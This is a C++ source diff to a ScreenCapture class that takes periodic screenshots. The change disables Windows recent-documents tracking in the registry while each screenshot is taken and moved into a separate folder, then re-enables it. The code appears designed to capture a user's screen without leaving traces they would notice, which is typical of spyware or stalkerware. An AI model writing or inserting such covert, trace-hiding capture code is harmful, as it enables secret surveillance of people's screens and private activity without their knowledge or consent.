@@ -9,6 +9,7 @@
 #include <expected>
 #include <userenv.h>
 #include <thread>
+#include <shlobj_core.h>
 
 namespace fs = std::filesystem;
 
@@ -114,15 +115,25 @@ std::string ScreenCapture::CreateFileName()
 
 void ScreenCapture::TakeScreenShot()
 {
-    CreateScreenShot();
-    std::this_thread::sleep_for(std::chrono::milliseconds(200));
-    std::string folderDirectory = GetUserDirectory() + SCREENSHOT_FOLDER;
-    std::string fileName = PublicFunctions::GetLastCreatedFile(folderDirectory);
-    std::string newFileName = CreateFileName();
-    fs::rename(fileName, folderDirectory + newFileName);
-    fs::copy(folderDirectory + newFileName, directory);
-    fs::remove(fileName);
-    fs::remove((folderDirectory + newFileName));
+    const wchar_t* regKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
+    const wchar_t* regValueName = L"Start_TrackDocs";
+    DWORD disableValue = 0;
+    HKEY hKey;
+
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, regKeyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueEx(hKey, regValueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&disableValue), sizeof(disableValue));
+
+        CreateScreenShot();
+        std::this_thread::sleep_for(std::chrono::milliseconds(200));
+        std::string folderDirectory = GetUserDirectory() + SCREENSHOT_FOLDER;
+        std::string fileName = PublicFunctions::GetLastCreatedFile(folderDirectory);
+        std::string newFileName = directory + "\\" + CreateFileName();
+        fs::rename(fileName, newFileName);
+        
+        DWORD disableValue = 1;
+        RegSetValueEx(hKey, regValueName, 0, REG_DWORD, reinterpret_cast<BYTE*>(&disableValue), sizeof(disableValue));
+        RegCloseKey(hKey);
+    }
 }
 
 void ScreenCapture::StartScreenCaptureThread(uint32_t interval)
